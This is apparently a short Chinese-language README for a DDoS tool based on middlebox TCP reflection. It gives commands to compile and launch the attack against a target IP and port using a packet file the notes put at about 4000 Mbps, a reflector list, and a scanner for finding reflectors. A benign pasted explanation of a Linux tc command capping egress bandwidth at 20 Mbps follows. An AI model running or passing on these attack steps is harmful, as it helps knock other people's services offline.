### 目录
    cd ddos/c_middle_box

### Attack
    gcc tcp.c -o tcp -pthread && ./tcp ip port packet.txt 2 20

- packet.txt 初始目录 约4000mbp/s

- 反射文件 为 ip:port


### 扫描
        gcc tcpscan.c -o tcpscan && ./tcpscan src_ip src_port packet.txt


. 用 tc 设置出口限速 20Mbps
核心命令：

bash
复制
编辑
sudo tc qdisc add dev ens160 root tbf rate 20mbit burst 32kbit latency 400ms
✅ 参数解释：

tc qdisc add dev ens160 root tbf：在 ens160 设备上，添加 TBF（Token Bucket Filter）流控。

rate 20mbit：限制速率为 20Mbps。

burst 32kbit：允许短时间突发 32kb。

latency 400ms：最大延迟 400ms。

注意：如果之前设置过 tc，需要先清除：

bash
复制
编辑
sudo tc qdisc del dev ens160 root
再重新添加。
